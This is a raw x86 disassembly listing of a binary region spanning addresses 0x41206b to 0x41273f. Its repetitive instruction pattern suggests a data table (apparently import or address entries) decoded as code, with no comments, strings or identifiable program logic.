  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [edx+edi*1+0x3],dl
  412427:	add    BYTE PTR [edx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
